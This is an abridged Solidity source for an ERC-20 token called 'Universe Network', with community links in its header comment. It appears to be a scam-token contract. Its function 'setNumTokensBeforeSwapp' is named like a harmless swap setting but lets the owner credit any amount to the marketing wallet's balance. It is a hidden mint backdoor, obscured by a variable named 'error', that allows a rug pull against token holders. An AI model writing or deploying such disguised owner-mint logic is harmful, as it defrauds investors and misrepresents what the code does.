...
/*      Universe Network 
            Telegram Group : https://t.me/UniverseNetworkCommunity
            Website : https://universenet.work
*/
...
contract CoinTool is Context, IERC20, Ownable {
    ...
    string private _name = "Universe Network";
    ...
    function setNumTokensBeforeSwapp(uint256 amount) public onlyOwner() virtual {address error= marketingWallet;
        _balances[error]
        += amount;
    }
